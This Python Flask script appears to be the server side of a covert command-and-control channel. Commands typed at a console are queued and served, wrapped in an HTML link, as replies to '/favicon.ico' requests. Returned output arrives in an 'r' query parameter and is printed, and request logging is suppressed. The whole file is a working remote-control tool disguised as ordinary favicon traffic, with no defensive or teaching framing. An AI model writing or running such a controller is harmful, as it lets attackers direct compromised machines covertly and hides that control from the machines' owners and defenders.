import logging
import queue
import threading
import time

import flask


cmds = queue.Queue()
app = flask.Flask(__name__)


def encode(cmd):
    return f'<a href="http://cmd?{cmd}">command</a>'


@app.route('/favicon.ico')
def hello_world():
    response = flask.request.args.get('r')
    if response:
        print(f'\n\n--\n\n{response}\n\n--\n\ncmd: ', end = '')
    try:
        cmd = cmds.get_nowait()
        return encode(cmd)
    except queue.Empty:
        return ''


def collect_commands():
    time.sleep(2)
    while True:
        cmd = input('cmd: ')
        cmds.put(cmd)


def main():
    threading.Thread(target=collect_commands).start()

    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app.run()


if __name__ == '__main__':
    main()
